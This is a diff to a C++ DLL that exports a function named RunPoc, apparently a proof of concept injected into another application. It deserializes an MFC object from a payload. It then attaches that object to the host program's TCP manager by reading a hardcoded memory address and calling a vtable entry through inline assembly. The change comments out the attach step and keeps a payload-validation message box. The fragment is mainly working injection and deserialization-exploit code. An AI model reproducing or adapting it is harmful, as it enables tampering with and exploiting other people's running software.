@@ -42,44 +42,35 @@ extern "C" __declspec(dllexport) void RunPoc()
 
     if (!obj) { ShowError(_T("CreateObject failed")); return; }
 
-    // 1. 反序列化
+    // 1. 反序列化验证
     try {
         obj->Serialize(ar);
+        ::MessageBox(NULL, _T("✅ Serialize OK! Payload is Valid."), _T("Success"), MB_OK);
     } catch (CException* e) {
         e->Delete();
         ShowError(_T("Serialize Failed"));
-        delete obj; // 只有失败才删
         return;
     }
 
-    // 2. 挂载到 TCP Manager
+    // 2. 挂载逻辑 (暂时屏蔽)
+    /*
     void* pManager = *(void**)0x0084713C;
-
-    if (!pManager) {
-        ShowError(_T("Manager is NULL"));
-        delete obj;
-        return;
+    if (pManager) {
+        try {
+            DWORD* vtable = *(DWORD**)pManager;
+            void* pAddFunc = (void*)vtable[34];
+            __asm {
+                push 1
+                push obj
+                mov ecx, pManager
+                call pAddFunc
+            }
+            ::MessageBox(NULL, _T("Attached!"), _T("Done"), MB_OK);
+        } catch (...) {}
     }
+    */
 
-    try {
-        DWORD* vtable = *(DWORD**)pManager;
-        void* pAddFunc = (void*)vtable[34];
-
-        int result = 0;
-        __asm {
-            push 1
-            push obj
-            mov ecx, pManager
-            call pAddFunc
-            mov result, eax
-        }
-
-        ::MessageBox(NULL, _T("Inject Success! Check Tree View!"), _T("Done"), MB_OK);
-    }
-    catch (...) {
-        ShowError(_T("Crash during Attach"));
-    }
-
+    // 暂不 delete obj，避免析构潜在崩溃
     ar.Close();
     memFile.Close();
 }
